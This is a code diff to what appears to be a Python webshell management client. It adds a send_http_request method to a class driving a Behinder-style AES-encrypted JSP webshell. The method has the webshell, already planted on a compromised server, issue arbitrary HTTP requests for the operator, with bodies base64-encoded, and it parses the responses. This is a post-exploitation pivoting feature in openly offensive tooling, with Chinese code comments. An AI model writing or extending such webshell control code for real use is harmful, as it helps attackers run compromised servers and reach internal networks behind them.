@@ -21,6 +21,7 @@ from ..core.base import (
     OptionGroup,
     DirectoryEntry,
     get_http_client,
+    HttpResponseDict,
 )
 
 from ..utils.tools import parse_permission, java_repr, md5_encode, base64_encode
@@ -427,3 +428,58 @@ class JSPWebshellBehinderAES:
 
     async def get_pwd(self) -> str:
         return await self.submit_code("getPwd()")
+
+    async def send_http_request(
+        self,
+        url: str,
+        method: str = "GET",
+        headers: t.Optional[t.Dict[str, str]] = None,
+        params: t.Optional[t.Dict[str, t.Any]] = None,
+        data: t.Optional[t.Union[str, bytes]] = None
+    ) -> "HttpResponseDict":
+        """发送HTTP请求"""
+        import base64
+        from ..core.base import HttpResponseDict
+
+        # 将headers和params转换为Java HashMap
+        headers_java = java_repr(headers) if headers is not None else "new java.util.HashMap<String, String>()"
+        params_java = java_repr(params) if params is not None else "new java.util.HashMap<String, String>()"
+
+        # 处理data
+        data_b64 = ""
+        if isinstance(data, bytes):
+            data_b64 = base64_encode(data)
+        elif isinstance(data, str):
+            data_b64 = base64_encode(data.encode())
+        # 如果data为None，data_b64保持空字符串
+
+        # 构建Java代码
+        java_code = f"sendHttpRequest({java_repr(url)}, {java_repr(method)}, {headers_java}, {params_java}, {java_repr(data_b64)})"
+
+        # 提交代码并获取结果
+        result = await self.submit_code(java_code)
+
+        # 解析结果
+        if not isinstance(result, dict):
+            raise exceptions.TargetRuntimeError(f"sendHttpRequest返回的结果不是字典: {result}")
+
+        status_code = result.get("status_code")
+        if status_code is None:
+            raise exceptions.TargetRuntimeError("sendHttpRequest返回的字典缺少status_code")
+
+        headers_dict = result.get("headers")
+        if headers_dict is None:
+            raise exceptions.TargetRuntimeError("sendHttpRequest返回的字典缺少headers")
+
+        body_b64 = result.get("body")
+        if body_b64 is None:
+            raise exceptions.TargetRuntimeError("sendHttpRequest返回的字典缺少body")
+
+        # 解码body
+        body_bytes = base64.b64decode(body_b64) if body_b64 else b""
+
+        return {
+            "status_code": status_code,
+            "headers": headers_dict,
+            "body": body_bytes
+        }
